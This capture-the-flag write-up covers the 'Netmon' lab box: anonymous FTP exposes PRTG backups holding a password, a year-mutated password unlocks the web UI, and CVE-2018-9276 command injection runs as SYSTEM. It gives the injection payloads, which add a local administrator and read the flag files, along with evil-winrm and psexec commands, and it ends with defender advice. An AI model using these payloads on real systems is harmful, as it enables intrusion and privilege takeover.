---
title: Netmon
description: FTP anonymous access exposes PRTG config files with stale credentials. Year-mutation unlocks the web UI. CVE-2018-9276 command injection as SYSTEM — flags extracted via FTP after shell access proved unstable.
---

# Netmon

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Windows Server 2016 |
| **CVE** | CVE-2018-9276 (PRTG Network Monitor RCE) |

Netmon is a lesson in credential exposure and the danger of default storage locations.
PRTG Network Monitor stores its configuration — including credentials — in predictable flat files on disk.
Anonymous FTP hands you the entire filesystem. The credentials in the backup are stale, but one small mutation opens the door.

The box also taught me that getting a stable shell isn't always necessary. PRTG runs as SYSTEM, and if command injection gives you SYSTEM-level execution, you can read any file on the box without ever landing an interactive session.

---

## Setup

Kali VM via QEMU. VPN connected with openvpn.
If large packets time out, lower the MTU on the tunnel interface:

```bash
sudo ip link set tun0 mtu 1200
```

---

## Enumeration

```bash
nmap -sC -vv -oA nmap_init <IP>
```

**Open ports:**

| Port | Service | Detail |
|------|---------|--------|
| 21 | ftp | Anonymous login allowed — full C: drive exposed |
| 80 | http | PRTG Network Monitor web UI |
| 135 | msrpc | Microsoft RPC |
| 139 | netbios-ssn | NetBIOS |
| 445 | microsoft-ds | SMB |
| 5985 | wsman | WinRM |

TTL 127 confirms Windows. Two immediate attack surfaces: FTP (anonymous, no creds needed) and the PRTG web UI on port 80 (needs credentials). FTP first.

---

## FTP Anonymous Access

Anonymous FTP login is allowed and exposes the full C: drive. PRTG stores its data under:

```
C:\ProgramData\Paessler\PRTG Network Monitor\
```

```bash
ftp <IP>
# user: anonymous
# pass: (blank)
```

Three config files are present:

```
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak
```

The `.old.bak` file is a stale backup and tends to contain credentials in cleartext. Download it:

```bash
get "PRTG Configuration.old.bak"
```

Search for credentials:

```bash
grep -i "dbpassword" "PRTG Configuration.old.bak"
```

Found: `prtgadmin : PrTg@dmin2018`

---

## Credential Discovery — Year Mutation

The backup is from 2018. Tried the exact credentials on the PRTG web login — failed.

This is a common pattern with stale config files: the password was rotated but followed an obvious convention. Tried incrementing the year by one:

```
prtgadmin : PrTg@dmin2019
```

That worked. Inside the PRTG dashboard.

**The lesson:** when credentials from a backup fail, think about what small, predictable mutation makes them current — year increment, version number, appended character. Brute-force is a last resort.

---

## Exploitation — CVE-2018-9276

PRTG versions before 18.2.39 are vulnerable to authenticated command injection via the notification system. The parameter field passed to the Execute Program notification type is not sanitised — anything after a semicolon runs as a separate command under the PRTG service account, which is **SYSTEM**.

**Path:**
Setup → Account Settings → Notifications → Add new notification → Execute Program

**Payload to create a local admin user:**

```
test.txt;net user htb Password123 /add&net localgroup administrators htb /add
```

After saving, click the bell/play icon next to the notification to trigger it — saving alone does nothing.

**Syntax note:** Windows CMD uses `&` to chain commands, not `;`. The `;` only works as the injection separator into PRTG's parameter handling. The second command must use `&`.

---

## Shell Attempts — What Failed

With the `htb` local admin account created, tried two routes:

**evil-winrm (port 5985):**
```bash
evil-winrm -i <IP> -u htb -p 'Password123'
```
The session connected but dropped immediately on the first command with `WinRM::WinRMAuthorizationError`. The account exists but UAC token filtering strips the elevated token for local accounts over WinRM — the session opens but commands requiring elevation fail.

**impacket-psexec / smbclient (port 445):**
```bash
impacket-psexec htb:'Password123'@<IP>
smbclient //<IP>/C$ -U htb%'Password123'
```
Both returned `STATUS_LOGON_FAILURE`. This is Windows UAC token filtering for local (non-domain) accounts over SMB — local admins cannot access admin shares like `C$` remotely unless `LocalAccountTokenFilterPolicy` is explicitly enabled. No workaround without a working shell first.

---

## Flag Extraction — PRTG as SYSTEM

Since PRTG runs as SYSTEM, the command injection can read any file on the box regardless of ACLs.
Rather than fighting the shell stability issues, used two more notifications to write the flags to C:\ and retrieved them via FTP.

**Notification 1:**
```
test.txt;type "C:\Users\Administrator\Desktop\root.txt" > C:\root_flag.txt
```

**Notification 2:**
```
test.txt;type "C:\Users\Public\Desktop\user.txt" > C:\user_flag.txt
```

Trigger both, then retrieve via FTP:

```bash
ftp <IP>
# anonymous login
get root_flag.txt
get user_flag.txt
```

**User flag:** `<!-- insert here -->`

**Root flag:** `<!-- insert here -->`

---

!!! example "Conclusion"
    The attack chain is straightforward but the execution had rough edges. Getting a stable shell never worked — UAC token filtering blocked both SMB admin share access and WinRM command execution for the local account created via command injection. The real insight was recognising that a stable shell isn't always necessary: PRTG runs as SYSTEM, so SYSTEM-level execution was available the whole time through the notification system. Writing the flags to disk and pulling them via anonymous FTP was cleaner than any shell approach would have been.

    Defender takeaways: FTP anonymous access to the full filesystem is the root cause here — remove it. PRTG config backups with plaintext credentials should never sit in a world-readable location. And PRTG running as SYSTEM is a misconfiguration — it needs only service-level privileges. Any one of those three changes breaks the chain.
